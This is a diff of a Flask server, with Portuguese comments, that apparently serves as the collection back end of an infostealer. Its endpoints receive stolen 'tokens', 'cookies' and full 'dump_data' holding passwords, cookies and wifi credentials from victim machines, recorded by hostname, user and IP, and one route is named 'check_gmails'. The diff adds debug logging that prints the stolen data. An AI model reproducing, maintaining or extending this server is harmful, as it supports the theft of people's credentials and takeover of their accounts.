@@ -36,6 +36,8 @@ def register_endpoint():
     
     try:
         data = request.json
+        print(f"[DEBUG] Registro recebido: {data}")
+        
         endpoint_id = data.get('endpoint_id', 'unknown')
         
         endpoints[endpoint_id] = {
@@ -51,9 +53,10 @@ def register_endpoint():
             'last_seen': datetime.now().strftime('%H:%M:%S')
         }
         
-        print(f"✅ Endpoint registrado: {endpoint_id}")
-        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
+        print(f"[DEBUG] Endpoint {endpoint_id} registrado com sucesso")
+        return jsonify({'status': 'success'})
     except Exception as e:
+        print(f"[ERRO] Erro no registro: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/metrics', methods=['POST', 'OPTIONS'])
@@ -83,17 +86,40 @@ def receive_tokens():
     
     try:
         data = request.json
+        print(f"[DEBUG] Tokens recebidos: {data}")
+        
         endpoint_id = data.get('endpoint_id', 'unknown')
         tokens = data.get('tokens', [])
+        
+        print(f"[DEBUG] Endpoint ID: {endpoint_id}")
+        print(f"[DEBUG] Número de tokens: {len(tokens)}")
         
         endpoint_tokens[endpoint_id] = {
             'tokens': tokens,
             'timestamp': datetime.now().isoformat()
         }
         
-        print(f"🔑 Tokens recebidos de {endpoint_id}: {len(tokens)} tokens")
+        # Atualiza endpoint se não existir
+        if endpoint_id not in endpoints:
+            endpoints[endpoint_id] = {
+                'id': endpoint_id,
+                'hostname': 'Unknown',
+                'user': 'Unknown',
+                'ip_address': 'Unknown',
+                'external_ip': 'Unknown',
+                'platform': 'Unknown',
+                'ram': 'Unknown',
+                'timestamp': datetime.now().isoformat(),
+                'status': 'online',
+                'last_seen': datetime.now().strftime('%H:%M:%S')
+            }
+        
+        print(f"[DEBUG] {len(tokens)} tokens armazenados para {endpoint_id}")
         return jsonify({'status': 'success'})
     except Exception as e:
+        print(f"[ERRO] Erro nos tokens: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/cookies', methods=['POST', 'OPTIONS'])
@@ -163,8 +189,13 @@ def receive_full_report():
     
     try:
         data = request.json
+        print(f"[DEBUG] Full report recebido: {data}")
+        
         endpoint_id = data.get('endpoint_id', 'unknown')
         dump_data = data.get('dump_data', {})
+        
+        print(f"[DEBUG] Endpoint ID: {endpoint_id}")
+        print(f"[DEBUG] Dump data keys: {list(dump_data.keys())}")
         
         # Extrai dados do dump
         system_info = dump_data.get('system', {})
@@ -172,6 +203,8 @@ def receive_full_report():
         passwords = dump_data.get('passwords', [])
         cookies = dump_data.get('cookies', [])
         wifi = dump_data.get('wifi', [])
+        
+        print(f"[DEBUG] Tokens: {len(tokens)}, Senhas: {len(passwords)}, Cookies: {len(cookies)}")
         
         # Armazena nos endpoints existentes
         if endpoint_id not in endpoints:
@@ -218,6 +251,9 @@ def receive_full_report():
         
         return jsonify({'status': 'success', 'message': 'Full report received'})
     except Exception as e:
+        print(f"[ERRO] Erro no full_report: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/check_gmails/<endpoint_id>', methods=['GET'])
